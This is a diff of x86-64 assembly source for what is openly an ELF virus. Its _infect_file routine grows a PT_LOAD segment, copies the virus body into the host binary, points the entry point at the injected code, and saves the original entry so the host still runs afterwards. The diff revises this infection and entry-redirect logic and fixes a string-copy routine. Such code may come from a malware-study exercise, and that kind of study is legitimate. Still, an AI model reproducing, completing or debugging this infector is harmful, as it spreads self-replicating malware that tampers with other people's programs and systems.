@@ -375,12 +375,6 @@ _infect_file: ; (string rdi, stat rsi)
 
 			mov rsi, [rdi + 8]
 			add rsi, [rdi + 32]; rsi at the end of pt_load
-			; change entry
-			mov r14, [r13 + 24]; save entry
-			mov [r13 + 24], rsi
-			; change pt_load size
-			add [rdi + 32], rax; p_filesz + virus
-			add [rdi + 40], rax; p_memsz + virus
 
 			; copy virus
 			push rdi
@@ -399,10 +393,24 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rdi, [rbx + 16]
 			mov [rax], rdi ; vaddr
 			add rax, 8
-			mov rdi, [rbx + 32]
-			mov [rax], rdi; entry_inject
+			mov rdi, [rbx + 8] ; p_offset
+			mov [rax], rdi
+			mov rdi, [rbx + 32]; p_filesz
+			add [rax], rdi
+;			mov [rax], rdi ; entry_inject
 			add rax, 8
-			mov [rax], r14
+			mov rdi, [r13 + 24]; entry_prg
+			mov [rax], rdi
+
+			; change entry
+			mov rsi, [rbx + 8]
+			add rsi, [rbx + 32]
+			mov [r13 + 24], rsi
+
+			; change pt_load size
+			add rdx, 8 * 3
+			add [rbx + 32], rdx; p_filesz + virus
+			add [rbx + 40], rdx; p_memsz + virus
 
 			; write everything in file
 			mov rdi, r11
@@ -446,11 +454,26 @@ _host:
 	jmp _exit
 
 _infected:
-	mov rsi, r8
-	sub rsi, [rel entry_inject]
-	add rsi, [rel vaddr]
+	mov rdi, [rel vaddr]
+	mov rax, 9
+	syscall
+	mov rdi, [rel entry_inject]
+	mov rax, 9
+	syscall
+	mov rdi, [rel entry_prg]
+	mov rax, 9
+	syscall
 
-	mov rax, rsi
+	push r8
+	pop rax
+
+	mov rdi, [rel entry_inject]
+	sub rdi, [rel vaddr]
+	sub rax, rdi
+
+;	sub rax, [rel entry_inject]
+;	add rax, [rel vaddr]
+
 	add rax, [rel entry_prg]
 	sub rax, [rel vaddr]
 
@@ -542,6 +565,8 @@ _ft_strcpy: ; (string rdi, string rsi)
 		inc rcx
 	jmp .loop_char
 	.return:
+		xor al, al
+		mov [rdi + rcx], al
 		mov rax, rdi
 
 	pop rcx
